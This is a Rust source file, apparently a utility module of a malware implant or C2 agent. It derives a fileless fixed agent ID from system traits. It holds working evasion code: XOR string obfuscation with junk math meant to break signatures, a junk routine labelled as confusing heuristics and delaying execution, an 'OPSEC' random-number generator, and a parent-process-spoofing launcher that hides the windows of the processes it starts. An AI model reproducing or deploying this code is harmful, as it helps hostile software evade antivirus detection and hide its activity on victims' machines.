// Agent Identity Utils - 无文件持久化身份识别
//
// 通过系统特征生成固定的 Agent UUID，无需在磁盘上存储任何文件
// 使用用户 SID、机器名、处理器架构等特征进行哈希计算

use sha2::{Sha256, Digest};
use uuid::Builder;
use log::debug;

/// Simple compile-time XOR obfuscation for strings
#[macro_export]
macro_rules! obf_str {
    ($s:expr) => {{
        let bytes = $s.as_bytes();
        let mut obf = Vec::with_capacity(bytes.len());
        for b in bytes {
            obf.push(b ^ 0x42); // Simple XOR key
        }
        obf
    }};
}

pub fn decode_obf(bytes: &[u8]) -> String {
    let mut decoded = Vec::with_capacity(bytes.len());
    let mut _junk = 0;
    for (i, b) in bytes.iter().enumerate() {
        // Add junk math to break the signature of the loop
        _junk = (i as u32).wrapping_add(0xDEADBEEF).count_ones();
        decoded.push(b ^ 0x42);
    }
    // Prevent optimization of junk
    if _junk > 999 { return String::new(); }
    
    String::from_utf8_lossy(&decoded).to_string()
}

/// 生成基于系统特征的固定 Agent UUID
/// 
/// 该函数通过以下步骤生成唯一且固定的 Agent 标识符：
/// 1. 获取当前用户的 SID（安全标识符）
/// 2. 获取计算机名作为盐值
/// 3. 获取处理器架构信息
/// 4. 将所有特征拼接并进行 SHA256 哈希
/// 5. 使用哈希结果的前 16 字节构造 UUID
/// 
/// # 特点
/// - 无文件持久化：不在磁盘上存储任何标识文件
/// - 权限友好：普通用户和访客用户均可执行
/// - 唯一性保证：同一台机器的同一用户始终生成相同 UUID
/// - 碰撞防护：不同机器或不同用户生成不同 UUID
/// 
/// # 返回值
/// 返回格式化的 UUID 字符串，例如：`550e8400-e29b-41d4-a716-446655440000`
pub fn get_agent_uuid() -> String {
    let mut identifier = String::new();
    
    // ⚡ OPTIMIZATION: Use Environment Variables (Minimal size)
    // 1. 获取当前用户名称
    let user = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "unknown_user".to_string());
    identifier.push_str(&user);
    
    // 2. 计算机名
    let host = std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown_host".to_string());
    identifier.push_str(&host);
    
    // 3. 处理器架构特征
    if let Ok(arch) = std::env::var("PROCESSOR_IDENTIFIER") {
        identifier.push_str(&arch);
    }
    
    // 如果所有特征都获取失败，使用固定字符串
    if identifier.is_empty() {
        identifier = "fallback-agent-id".to_string();
    }
    
    debug!("Final identifier string length: {}", identifier.len());
    
    // 4. 执行 SHA256 运算
    let mut hasher = Sha256::new();
    hasher.update(identifier.as_bytes());
    let result = hasher.finalize();
    
    // 5. 将哈希结果的前 16 字节构造为 UUID
    let bytes: [u8; 16] = result[..16].try_into().expect("Invalid hash length");
    let agent_uuid = Builder::from_bytes(bytes).into_uuid();
    
    let uuid_string = agent_uuid.to_string();
    debug!("Generated agent UUID: {}", uuid_string);
    
    uuid_string
}

/// Junk code to confuse heuristics and delay execution
pub fn junk_data_collector() {
    let mut data = Vec::with_capacity(1000);
    let mut _sum = 0.0;
    
    // 1. Computational noise (Heavy math)
    for i in 1..5000 {
        let val = (i as f64).sqrt().sin().cos();
        data.push(val);
        if i % 10 == 0 {
            _sum += val;
        }
    }

    // 2. Benign file system interaction (Reading a public system directory)
    // This looks like a legitimate system utility scanning its environment
    #[cfg(windows)]
    {
        let path = "C:\\Windows\\System32\\drivers\\etc";
        if let Ok(entries) = std::fs::read_dir(path) {
            for entry in entries.take(5) {
                if let Ok(e) = entry {
                    let _ = e.file_name();
                }
            }
        }
    }

    // 3. String manipulation noise
    let mut s = String::from("INIT_SEQ_");
    for i in 0..50 {
        s.push_str(&format!("{:x}", (i * 12345) % 0xFFFF));
    }
    
    // Safety fence: prevent compiler from optimizing away the junk computation
    // (This branch is unreachable, but the compiler cannot prove it statically)
    let _ = (_sum, s.len());
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_get_agent_uuid_consistency() {
        // 测试多次调用是否返回相同的 UUID
        let uuid1 = get_agent_uuid();
        let uuid2 = get_agent_uuid();
        
        assert_eq!(uuid1, uuid2, "UUID should be consistent across calls");
        assert!(!uuid1.is_empty(), "UUID should not be empty");
        
        // 验证 UUID 格式
        assert_eq!(uuid1.len(), 36, "UUID should be 36 characters long");
        assert_eq!(uuid1.chars().filter(|&c| c == '-').count(), 4, "UUID should have 4 hyphens");
    }
    
    #[test]
    fn test_uuid_format() {
        let uuid = get_agent_uuid();
        
        // 验证 UUID 格式：xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
        let parts: Vec<&str> = uuid.split('-').collect();
        assert_eq!(parts.len(), 5, "UUID should have 5 parts separated by hyphens");
        assert_eq!(parts[0].len(), 8, "First part should be 8 characters");
        assert_eq!(parts[1].len(), 4, "Second part should be 4 characters");
        assert_eq!(parts[2].len(), 4, "Third part should be 4 characters");
        assert_eq!(parts[3].len(), 4, "Fourth part should be 4 characters");
        assert_eq!(parts[4].len(), 12, "Fifth part should be 12 characters");
    }
}

/// Windows debug logging (Enabled for inspection)
pub fn db_print(msg: &str) {
    use log::debug;
    debug!("{}", msg);
}

// --- 🛡️ OPSEC: Dependency-free PRNG to avoid BCrypt initialization crashes ---
use std::sync::atomic::{AtomicU64, Ordering};

static RNG_STATE: AtomicU64 = AtomicU64::new(0);

/// Seed the global PRNG with a value (usually from SystemTime)
pub fn seed_rng(seed: u64) {
    RNG_STATE.store(seed, Ordering::SeqCst);
}

/// Get a pseudo-random u32 without calling any external system APIs (like BCryptGenRandom)
pub fn next_u32() -> u32 {
    let mut current = RNG_STATE.load(Ordering::SeqCst);
    if current == 0 {
        // Fallback seed if not seeded
        current = 0xDEADEADBEBEBEBEB;
    }
    
    // LCG: state = (state * a + c) % m
    let next = current.wrapping_mul(6364136223846793005).wrapping_add(1);
    RNG_STATE.store(next, Ordering::SeqCst);
    (next >> 32) as u32
}

pub fn random_bool(p: f64) -> bool {
    let threshold = (p * 4294967295.0) as u32;
    next_u32() < threshold
}

/// ⚡ 隐蔽进程启动：使用 PPID Spoofing 假冒父进程并隐藏窗口
#[cfg(windows)]
pub fn spawn_spoofed_process(cmd: &str, parent_name: &str) -> Option<u32> {
    use std::ptr;
    use std::os::windows::ffi::OsStrExt;
    use winapi::um::processthreadsapi::*;
    use winapi::um::tlhelp32::*;
    use winapi::um::handleapi::*;
    use winapi::shared::minwindef::*;

    unsafe {
        // 1. 查找父进程 PID
        let mut ppid = 0;
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot != INVALID_HANDLE_VALUE {
            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
            if Process32FirstW(snapshot, &mut entry) != 0 {
                loop {
                    let curr = String::from_utf16_lossy(&entry.szExeFile).trim_matches(char::from(0)).to_lowercase();
                    if curr.contains(&parent_name.to_lowercase()) {
                        ppid = entry.th32ProcessID;
                        break;
                    }
                    if Process32NextW(snapshot, &mut entry) == 0 { break; }
                }
            }
            CloseHandle(snapshot);
        }

        if ppid == 0 { return None; }

        // 2. 初始化属性列表进行 PPID 欺骗
        let mut si_ex: STARTUPINFOEXW = std::mem::zeroed();
        si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;

        let mut list_size: usize = 0;
        InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut list_size);
        let mut lp_list = vec![0u8; list_size];
        let attribute_list = lp_list.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST;

        if InitializeProcThreadAttributeList(attribute_list, 1, 0, &mut list_size) == 0 { return None; }

        let mut parent_handle = OpenProcess(winapi::um::winnt::PROCESS_CREATE_PROCESS, FALSE, ppid);
        if parent_handle.is_null() { return None; }

        UpdateProcThreadAttribute(attribute_list, 0, 0x00020000, &mut parent_handle as *mut _ as *mut _, std::mem::size_of::<winapi::um::winnt::HANDLE>(), ptr::null_mut(), ptr::null_mut());
        si_ex.lpAttributeList = attribute_list;

        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmd).encode_wide().chain(std::iter::once(0)).collect();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        // 🚀 CREATE_NO_WINDOW + EXTENDED_STARTUPINFO_PRESENT
        let res = CreateProcessW(
            ptr::null(), cmd_w.as_mut_ptr(),
            ptr::null_mut(), ptr::null_mut(), FALSE,
            0x08000000 | 0x00080000, // CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT
            ptr::null_mut(), ptr::null(),
            &mut si_ex.StartupInfo, &mut pi
        );

        DeleteProcThreadAttributeList(attribute_list);
        CloseHandle(parent_handle);

        if res != 0 {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            Some(pi.dwProcessId)
        } else {
            None
        }
    }
}